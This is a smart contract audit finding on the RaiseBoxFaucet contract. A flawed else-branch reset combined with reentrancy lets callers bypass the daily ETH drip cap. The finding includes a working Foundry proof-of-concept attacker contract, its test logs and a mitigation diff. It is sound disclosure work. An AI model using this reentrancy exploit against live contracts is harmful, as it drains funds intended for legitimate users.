
# [H-02] Daily ETH Drip Cap Can Be Bypassed Via Reentrancy, Leading to Fund Depletion

| | |
| --- | --- |
| **Finding ID** | H-02 |
| **Contract** | `RaiseBoxFaucet.sol` |
| **Functions** | `claimFaucetTokens()` |
| **Severity** | High (Upgraded from Medium due to reentrancy vector) |

---

## Description

**Normal Behavior:**
The `RaiseBoxFaucet` contract is designed to distribute a limited amount of Sepolia ETH to first-time users each day, governed by the `dailySepEthCap` state variable. The amount of ETH distributed is tracked by the `dailyDrips` counter, which should only reset at the beginning of a new day.

**The Issue:**
The `claimFaucetTokens()` function contains two vulnerabilities that, when combined, allow for the complete bypass of the daily ETH cap:

1. **Incorrect State Reset:** The logic contains an `else` branch that incorrectly resets the `dailyDrips` counter to zero whenever a claim is made by a user who is *not* eligible for an ETH drip (e.g., a returning user).
2. **Reentrancy Vulnerability:** The function transfers ETH using a low-level `.call{value: ...}` *before* all state changes are finalized (specifically, before `lastClaimTime` is updated). This violates the Checks-Effects-Interactions pattern and opens the door to a reentrancy attack.

An attacker can exploit this by deploying a smart contract that calls `claimFaucetTokens()`. When the faucet sends ETH to the attacker's contract, its `receive()` function is triggered, which re-enters the `claimFaucetTokens()` function.

On the re-entrant call, `hasClaimedEth` for the attacker contract is already `true`. This causes the execution to hit the flawed `else` branch, resetting `dailyDrips` to `0` immediately. The attacker can repeat this process by deploying new attacker contracts, allowing them to facilitate the draining of significantly more ETH than the `dailySepEthCap` allows within a single day.

```solidity
// src/RaiseBoxFaucet.sol

function claimFaucetTokens() public {
    // ... Checks ...

    if (!hasClaimedEth[faucetClaimer] && !sepEthDripsPaused) {
        // ... (Logic to check daily cap and prepare for drip)

        if (dailyDrips + sepEthAmountToDrip <= dailySepEthCap && address(this).balance >= sepEthAmountToDrip) {
            hasClaimedEth[faucetClaimer] = true; // Effect
            dailyDrips += sepEthAmountToDrip;   // Effect

@>          (bool success, ) = faucetClaimer.call{value: sepEthAmountToDrip}(""); // Interaction (Reentrancy Point)

            // ...
        }
    } else {
@>      dailyDrips = 0; // Flawed reset logic triggered on re-entrant call
    }
    
    // ...

    // The lastClaimTime update happens AFTER the external call, which is too late to prevent reentrancy.
    lastClaimTime[faucetClaimer] = block.timestamp;
    dailyClaimCount++;
    _transfer(address(this), faucetClaimer, faucetDrip);
    // ...
}
```

## Risk

**Likelihood**: High

* The attack is straightforward to execute by deploying a simple contract. It does not require any special privileges or complex conditions.

**Impact**: High

* The `dailySepEthCap` safeguard is rendered completely ineffective. An attacker can repeatedly reset the daily drip counter, enabling them and other users to drain a much larger amount of the contract's ETH balance than intended. This depletes funds meant for legitimate new users and undermines a core security mechanism of the faucet.

## Proof of Concept (PoC)

The following Foundry test demonstrates how an attacker can use a contract to re-enter `claimFaucetTokens()` and reset the `dailyDrips` counter, allowing the daily ETH cap to be bypassed multiple times.

**PoC Test Code (`test/EthCapBypass_Reentrancy.t.sol`):**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import {Test, console} from "forge-std/Test.sol";
import {RaiseBoxFaucet} from "../src/RaiseBoxFaucet.sol";

/// @notice Attacker contract used to trigger reentrancy via ETH drip
contract AttackClaimer {
    RaiseBoxFaucet public faucet;

    constructor(RaiseBoxFaucet _faucet) {
        faucet = _faucet;
    }

    /// @notice Initiates the first-time claim to receive ETH and trigger reentrancy
    function attack() external {
        faucet.claimFaucetTokens();
    }

    /// @notice Receive ETH from faucet and re-enter claimFaucetTokens
    receive() external payable {
        // On reentry, `hasClaimedEth[this]` is already true, so the faucet
        // executes the else-branch and resets `dailyDrips` to zero.
        faucet.claimFaucetTokens();
    }
}

contract EthCapBypassReentrancyTest is Test {
    RaiseBoxFaucet internal faucet;
    uint256 internal sepEthDripAmount;
    uint256 internal dailyEthCap;

    function setUp() public {
        // Configure small daily cap and drip amount for clarity
        dailyEthCap = 0.015 ether; // allows 3 drips of 0.005 ether
        sepEthDripAmount = 0.005 ether;

        // faucetDrip set to a reasonable token amount
        faucet = new RaiseBoxFaucet(
            "raiseboxtoken",
            "RB",
            1000 * 10 ** 18,
            sepEthDripAmount,
            dailyEthCap
        );

        // Fund faucet with ETH for drips
        vm.deal(address(faucet), 10 ether);

        // Advance time beyond the 3-day cooldown so first-time claimers can claim
        vm.warp(block.timestamp + 3 days + 1);
    }

    /// @notice Demonstrates bypass of daily ETH cap by resetting `dailyDrips` via reentrancy
    function test_BypassDailyEthCap_WithReentrancyResets() public {
        console.log("--- Begin realistic ETH cap bypass via reentrancy ---");
        console.log("Daily ETH cap:", dailyEthCap);
        console.log("ETH per claim:", sepEthDripAmount);

        uint256 totalEthToNewUsers;

        // Perform multiple cycles: new user claims (drip), then attacker contract
        // first-time claim triggers reentrancy and resets `dailyDrips` to zero.
        for (uint256 i = 0; i < 5; i++) {
            // New first-time user claims ETH
            address newUser = address(uint160(1000 + i)); // avoid precompile addresses
            vm.prank(newUser);
            faucet.claimFaucetTokens();
            totalEthToNewUsers += sepEthDripAmount;

            console.log("New user claim #%d; dailyDrips:", i + 1, faucet.dailyDrips());
            assertEq(newUser.balance, sepEthDripAmount, "New user should receive ETH drip");

            // Deploy a fresh attacker for first-time claim to trigger reentrancy
            AttackClaimer attacker = new AttackClaimer(faucet);
            attacker.attack();

            // After reentrancy, dailyDrips should be reset to zero within the same day
            uint256 dripsNow = faucet.dailyDrips();
            console.log("Attacker reentrancy executed; dailyDrips now:", dripsNow);
            assertEq(dripsNow, 0, "dailyDrips must reset to zero due to else-branch");
            assertEq(address(attacker).balance, sepEthDripAmount, "Attacker contract should receive ETH once");
        }

        console.log("Total ETH distributed to new users:", totalEthToNewUsers);
        assertTrue(
            totalEthToNewUsers > dailyEthCap,
            "Total ETH to new users should exceed the daily cap due to resets"
        );
        console.log("--- Attack succeeded: ETH distributed exceeded daily cap in one day ---");
    }
}
```

**Test Execution and Results:**

```bash
forge test --match-path test/EthCapBypass_Reentrancy.t.sol -vv
```

The test passes, and the logs confirm that `dailyDrips` is reset to `0` after each attacker's claim. This allows a total of `0.025 ether` to be distributed to new users, successfully bypassing the `0.015 ether` daily cap.

```bash
[PASS] test_BypassDailyEthCap_WithReentrancyResets() (gas: 2095572)
Logs:
  --- Begin realistic ETH cap bypass via reentrancy ---
  Daily ETH cap: 15000000000000000
  ETH per claim: 5000000000000000
  New user claim #1; dailyDrips: 5000000000000000
  Attacker reentrancy executed; dailyDrips now: 0
  New user claim #2; dailyDrips: 5000000000000000
  Attacker reentrancy executed; dailyDrips now: 0
  New user claim #3; dailyDrips: 5000000000000000
  Attacker reentrancy executed; dailyDrips now: 0
  New user claim #4; dailyDrips: 5000000000000000
  Attacker reentrancy executed; dailyDrips now: 0
  New user claim #5; dailyDrips: 5000000000000000
  Attacker reentrancy executed; dailyDrips now: 0
  Total ETH distributed to new users: 25000000000000000
  --- Attack succeeded: ETH distributed exceeded daily cap in one day ---
```

## Recommended Mitigation

A multi-pronged approach is recommended to fix this vulnerability:

1. **Remove the Flawed Reset Logic:** The primary fix is to remove the `else` branch that incorrectly resets `dailyDrips`. The counter should only be reset at the beginning of a new day.

2. **Implement a Reentrancy Guard:** To prevent this and other potential reentrancy attacks, use a well-audited reentrancy guard (like OpenZeppelin's `ReentrancyGuard`) and apply the `nonReentrant` modifier to the `claimFaucetTokens()` function.

3. **Adhere to Checks-Effects-Interactions:** As a best practice, all state changes (Effects) should be made before external calls (Interactions). The `lastClaimTime` update should be moved before the ETH transfer.

**Mitigation Diff:**

```diff
// src/RaiseBoxFaucet.sol
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";
+ import {ReentrancyGuard} from "@openzeppelin/contracts/utils/ReentrancyGuard.sol";

- contract RaiseBoxFaucet is ERC20, Ownable {
+ contract RaiseBoxFaucet is ERC20, Ownable, ReentrancyGuard {
    // ...

-   function claimFaucetTokens() public {
+   function claimFaucetTokens() public nonReentrant {
        // ... (Reset logic for dailyClaimCount as per H-01 fix)

        // ... (Checks)

        if (!hasClaimedEth[faucetClaimer] && !sepEthDripsPaused) {
            uint256 currentDay = block.timestamp / 24 hours;

            if (currentDay > lastDripDay) {
                lastDripDay = currentDay;
                dailyDrips = 0;
            }

            if (dailyDrips + sepEthAmountToDrip <= dailySepEthCap && address(this).balance >= sepEthAmountToDrip) {
                hasClaimedEth[faucetClaimer] = true;
                dailyDrips += sepEthAmountToDrip;

                (bool success, ) = faucetClaimer.call{value: sepEthAmountToDrip}("");
                if (!success) {
                    revert RaiseBoxFaucet_EthTransferFailed();
                }
                emit SepEthDripped(faucetClaimer, sepEthAmountToDrip);

            } else {
                emit SepEthDripSkipped(
                    faucetClaimer,
                    address(this).balance < sepEthAmountToDrip ? "Faucet out of ETH" : "Daily ETH cap reached"
                );
            }
-       } else {
-           dailyDrips = 0;
        }

        // Effects
        lastClaimTime[faucetClaimer] = block.timestamp;
        dailyClaimCount++;

        // Interactions
        _transfer(address(this), faucetClaimer, faucetDrip);

        emit Claimed(msg.sender, faucetDrip);
    }
    // ...
}
```

This combined fix removes the incorrect reset, prevents reentrancy, and makes the contract significantly more secure.
